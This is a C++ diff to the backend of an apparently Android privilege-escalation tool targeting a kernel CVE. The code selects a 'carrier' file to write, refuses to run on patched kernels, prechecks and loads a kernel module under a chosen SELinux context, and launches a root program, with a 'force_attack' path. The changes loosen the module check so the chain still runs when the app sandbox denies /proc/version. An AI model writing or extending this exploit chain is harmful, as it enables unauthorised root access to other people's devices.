@@ -18,40 +18,21 @@
 
 namespace ghostlock::backend::cve_2026_43284 {
 
-    bool resolve_carrier_token(std::uint64_t token,
-                               const steps::CarrierTarget *&primary,
-                               std::size_t &primary_count) noexcept {
-        primary = nullptr;
-        primary_count = 0U;
-        if (token == kCarrierTokenDefault) {
-            return true;
-        }
-        if (token >= kCarrierTokenLibbinderdebug && token <= kCarrierTokenMax) {
-            const std::size_t index =
-                    static_cast<std::size_t>(token - kCarrierTokenLibbinderdebug);
-            primary = &steps::kDefaultCarriers[index];
-            primary_count = 1U;
-            return true;
-        }
-        return false;
-    }
-
-    bool select_single_carrier(std::optional<std::uint64_t> token,
+    bool select_single_carrier(std::string_view path,
                                const platform::DeviceProbeOps &device,
-                               const steps::CarrierTarget *&out) noexcept {
-        out = nullptr;
-        const std::uint64_t value = token.value_or(kCarrierTokenDefault);
-        if (value != kCarrierTokenDefault) {
-            const steps::CarrierTarget *primary = nullptr;
-            std::size_t count = 0U;
-            if (!resolve_carrier_token(value, primary, count) || primary == nullptr ||
-                count != 1U) {
+                               steps::CarrierTarget &out) noexcept {
+        out = steps::CarrierTarget{};
+        if (!path.empty()) {
+            /* An explicit path comes straight from the profile; reject a
+             * malformed one fail-closed instead of writing somewhere else. */
+            if (!steps::valid_carrier_path(path)) {
                 return false;
             }
-            out = primary;
+            out.path = path;
+            out.size = 0U;
             return true;
         }
-        /* token 0 / absent: prefer the first default the device probe reports
+        /* Absent path: prefer the first default the device probe reports
          * present. When the probe cannot confirm any of them, fall back to the
          * first default instead of failing: the probe is a plain stat()/access()
          * and is denied for privileged domains on some devices (the Shizuku shell
@@ -61,23 +42,38 @@ namespace ghostlock::backend::cve_2026_43284 {
          * unusable, so an unconfirmed choice cannot silently write elsewhere. */
         if (device.file_fact != nullptr) {
             for (const steps::CarrierTarget &candidate : steps::kDefaultCarriers) {
-                char path[steps::kCarrierPathMaxBytes] = {};
-                const std::size_t n = candidate.path.size() < sizeof(path) - 1U
+                char probe_path[steps::kCarrierPathMaxBytes] = {};
+                const std::size_t n = candidate.path.size() < sizeof(probe_path) - 1U
                                               ? candidate.path.size()
-                                              : sizeof(path) - 1U;
+                                              : sizeof(probe_path) - 1U;
                 for (std::size_t i = 0U; i < n; ++i) {
-                    path[i] = candidate.path[i];
+                    probe_path[i] = candidate.path[i];
                 }
                 platform::FileFact fact{};
-                if (device.file_fact(device.ctx, path, fact) && fact.exists) {
-                    out = &candidate;
+                if (device.file_fact(device.ctx, probe_path, fact) && fact.exists) {
+                    out = candidate;
                     return true;
                 }
             }
         }
-        out = &steps::kDefaultCarriers[0];
+        out = steps::kDefaultCarriers[0];
         return true;
     }
+
+    namespace {
+        /* S4 R1 no-allocation default diagnostic: one line per triggered schema
+         * default, owner-qualified as section.key (R2 moves to owner paths). */
+        void emit_43284_default_used(void *ctx, std::string_view section,
+                                     std::string_view key,
+                                     profile::FieldSource source) noexcept {
+            (void)ctx;
+            (void)source;
+            (void)std::fprintf(stderr, "default_used=%.*s.%.*s\n",
+                               static_cast<int>(section.size()), section.data(),
+                               static_cast<int>(key.size()), key.data());
+            (void)std::fflush(stderr);
+        }
+    } // namespace
 
     BackendTerminalResult run_backend_terminal(const Cve2026_43284Profile &profile,
                                                const terminal::RootProgram &root_program,
@@ -100,7 +96,7 @@ namespace ghostlock::backend::cve_2026_43284 {
          * the run: the production path the App drives does not need to spell out
          * the default. Any other out-of-range value is still rejected. */
         const std::uint64_t selinux_token = profile.selinux_exec_context.value_or(
-                static_cast<std::uint64_t>(lkm::kSelinuxExecContextVendorModprobe));
+                kCve2026_43284SelinuxDefault);
         if (selinux_token > static_cast<std::uint64_t>(lkm::kSelinuxExecContextMax)) {
             result.error = BackendTerminalError::ProfileIncomplete;
             return result;
@@ -115,6 +111,10 @@ namespace ghostlock::backend::cve_2026_43284 {
                                    : BackendTerminalError::DeviceFactsIncomplete;
             return result;
         }
+        /* Carry the unknown-by-policy facts into the result/log. has_f4c50a4 is
+         * true only when /proc/version was actually read (device_facts.cpp), so
+         * an unknown marker cannot select PatchedKernel below. */
+        result.degraded = facts.degraded;
         if (facts.has_f4c50a4) {
             result.error = BackendTerminalError::PatchedKernel;
             return result;
@@ -124,7 +124,7 @@ namespace ghostlock::backend::cve_2026_43284 {
         policy_input.facts.release = facts.release.view();
         policy_input.facts.has_f4c50a4 = facts.has_f4c50a4;
         policy_input.profile_kmi = profile.kmi;
-        policy_input.lkm_path_token = profile.lkm_path;
+        policy_input.lkm_path = profile.lkm_path;
         policy_input.late_load_args_token = profile.late_load_args;
         lkm::LkmSelection selection{};
         if (!lkm::resolve_lkm_selection(policy_input, selection, result.lkm_error)) {
@@ -158,16 +158,41 @@ namespace ghostlock::backend::cve_2026_43284 {
         carriers.count = 1U;
 
         if (deps.precheck_lkm != nullptr && !deps.lkm_image_path.empty()) {
-            /* B5-9h-3: the precheck now needs the full VERMAGIC_STRING inputs.
-             * preempt comes from /proc/version; modversions/module_force_unload
-             * keep the audited-target defaults (not probeable unprivileged). */
+            /* B5-9h-3: the precheck needs the full VERMAGIC_STRING inputs. preempt
+             * comes from /proc/version; modversions/module_force_unload keep the
+             * audited-target defaults (not probeable unprivileged).
+             *
+             * When /proc/version was denied (untrusted_app), preempt is unknown
+             * and it is the only token we cannot pin. We do NOT accept any
+             * module: the precheck runs once per preempt polarity and passes
+             * only if one polarity clears EVERY rule, so release, mod_unload,
+             * modversions, aarch64 and the CRC/signature checks are still
+             * compared strictly. This relaxation is limited to the single
+             * policy-denied read and never applies when /proc/version is
+             * readable. Residual risk: an unknown preempt could mask another
+             * unobservable option difference, but the kernel's own
+             * check_modinfo()->same_magic() still rejects a mismatched module at
+             * load time, so nothing silently loads. */
             lkm::DeviceKernelFacts required{};
             required.release = facts.release.view();
             required.has_f4c50a4 = facts.has_f4c50a4;
             required.preempt = lkm::proc_version_has_preempt(facts.proc_version.view());
             lkm::ModuleFacts module_facts{};
-            if (!deps.precheck_lkm(deps.precheck_ctx, deps.lkm_image_path, required,
-                                   module_facts, result.image_error)) {
+            bool precheck_ok = deps.precheck_lkm(deps.precheck_ctx, deps.lkm_image_path,
+                                                 required, module_facts,
+                                                 result.image_error);
+            if (!precheck_ok && !facts.preempt_known()) {
+                lkm::DeviceKernelFacts alternate = required;
+                alternate.preempt = !required.preempt;
+                lkm::ModuleFacts alternate_facts{};
+                lkm::LkmImageError alternate_error = lkm::LkmImageError::None;
+                if (deps.precheck_lkm(deps.precheck_ctx, deps.lkm_image_path,
+                                      alternate, alternate_facts, alternate_error)) {
+                    precheck_ok = true;
+                    result.image_error = alternate_error;
+                }
+            }
+            if (!precheck_ok) {
                 result.error = BackendTerminalError::LkmPrecheckRejected;
                 return result;
             }
@@ -176,7 +201,9 @@ namespace ghostlock::backend::cve_2026_43284 {
         steps::ChainRequest request{};
         request.carriers = carriers.items.data();
         request.carrier_count = carriers.count;
-        request.wait_timeout_ms = deps.wait_timeout_ms;
+        /* S4 R4: the document carries the wait budget (schema default
+         * 15000); the injected deps value is the host-test/staged fallback. */
+        request.wait_timeout_ms = profile.wait_timeout_ms.value_or(deps.wait_timeout_ms);
         /* Target size from the composition root's fstat(2) of the same carrier
          * fd; 0 == unknown keeps the carrier's declared size authoritative. */
         request.target_size = deps.target_size;
@@ -262,11 +289,40 @@ namespace ghostlock::backend {
         for (const profile::Section &section : document.sections) {
             if (section.name == kCve2026_43284Section) owned.sections.push_back(section);
         }
+        /* S4 R1: the registry bind is the single authority for requiredness and
+         * defaults; each triggered default is reported before it is stored. */
         Cve2026_43284Profile view{};
-        const profile::BindStatus status = profile::bind<Cve2026_43284Schema>(
-                owned, view, profile::DecodeMode::Production);
+        profile::BindSink<Cve2026_43284Profile> sink = profile::make_sink(view);
+        sink.log = profile::BindLog{&cve_2026_43284::emit_43284_default_used,
+                                    nullptr};
+        const profile::BindStatus status = profile::bind_all(
+                profile::make_registry<Cve2026_43284Schema>(), owned, sink,
+                profile::BindMode::Production);
         if (!status.ok()) return status;
-        cve_2026_43284::cve_2026_43284_state(session).profile = view;
+        cve_2026_43284::Cve2026_43284State &state =
+                cve_2026_43284::cve_2026_43284_state(session);
+        state.profile = view;
+        /* S4 R1 device-gate diagnostic: print the resolved values so a before/after
+         * comparison can prove the schema defaults did not move any effective
+         * value. lkm_path is the concrete helper mirror the production bind uses;
+         * <bundled> when no module path is bound (unit tests). */
+        const std::uint64_t kmi = view.kmi.value_or(0U);
+        const std::uint64_t selinux = view.selinux_exec_context.value_or(
+                kCve2026_43284SelinuxDefault);
+        const std::uint64_t late_load =
+                view.late_load_args.value_or(kCve2026_43284LateLoadArgsDefault);
+        const std::string_view lkm_path = state.deps.lkm_image_path.empty()
+                                                  ? std::string_view{"<bundled>"}
+                                                  : state.deps.lkm_image_path;
+        (void)std::fprintf(
+                stderr,
+                "profile_resolved kmi=%llu lkm_path=%.*s selinux_ctx=%llu "
+                "late_load_args=%llu\n",
+                static_cast<unsigned long long>(kmi),
+                static_cast<int>(lkm_path.size()), lkm_path.data(),
+                static_cast<unsigned long long>(selinux),
+                static_cast<unsigned long long>(late_load));
+        (void)std::fflush(stderr);
         return status;
     }
 
@@ -279,6 +335,18 @@ namespace ghostlock::backend {
         const cve_2026_43284::BackendTerminalResult result =
                 cve_2026_43284::run_backend_terminal(state.profile, state.root_program,
                                                     state.sa, state.deps, force_attack, out);
+        if (platform::degraded_any(result.degraded)) {
+            /* The untrusted_app path loses /proc/version etc. by policy; emit
+             * the exact set once so the device gate can assert on it directly,
+             * on both the success and failure paths. In the shell domain every
+             * fact is readable, degraded_any() is false and no line is emitted,
+             * so that path's output is unchanged. */
+            char degraded[64] = {};
+            (void)platform::format_device_fact_degraded(result.degraded, degraded,
+                                                        sizeof(degraded));
+            (void)std::fprintf(stderr, "device_facts degraded=%s\n", degraded);
+            (void)std::fflush(stderr);
+        }
         if (!result.ready) {
             /* A silent Failed leaves the App with no diagnosis; name the reason. */
             (void)std::fprintf(stderr,
